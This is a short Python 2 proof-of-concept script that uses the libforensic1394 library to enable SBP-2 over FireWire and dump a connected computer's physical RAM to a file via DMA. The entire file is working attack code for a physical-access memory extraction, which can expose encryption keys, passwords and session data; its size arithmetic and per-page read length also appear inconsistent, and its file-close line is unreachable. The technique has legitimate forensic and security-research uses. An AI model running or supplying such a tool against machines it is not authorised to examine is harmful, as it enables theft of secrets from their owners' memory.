#!/usr/bin/env python
# -*- coding: utf-8 -*- 
print "PoC for RAM dumping with firewire and libforensic1394 library"
raw_input("Enter to start")

from forensic1394 import Bus 
from time import sleep 
from binascii import unhexlify 
from sys import argv
import os, sys

def usage():
	print "Usage : " + argv[0] + " <Byte Size Mo> <Outfile>"  

if len(argv)!=3 :
	usage()
	exit()

# Page size, nearly always 4096 bytes
PAGESIZE = 4096

#Arguments
#size in bytes
enddump = 1024*int(argv[1])
fileout = argv[2]

def dumpRAM(d):
# initiate dump file
	f = open(fileout, "w")
	print "Start> RAM dumping to " + fileout + "..."

# Skip the first 1 MiB of memory 
	addr = 1*1024*1024
	while True:
		#count of memory size
		size=addr/2048
		if size > enddump :
			print "End> RAM dumping finished to " + fileout + " (" + argv[1] + " MBytes)"
			exit()
		# Prepare a batch of 128 requests
		r = [(addr + PAGESIZE*i, 2048) for i in range(0, 128)]
		for	caddr ,	cand	in	d.readv(r):
			f.write(cand)
		addr += PAGESIZE * 128
	f.close()
		

b=Bus()

# Enable SBP-2 support to ensure we get DMA
b.enable_sbp2() 
sleep (2.0)

# Open the first device
try: 
	d = b.devices()[0]
	print d
	d.open()
	addr = dumpRAM(d)
except: 
	print "No device found"

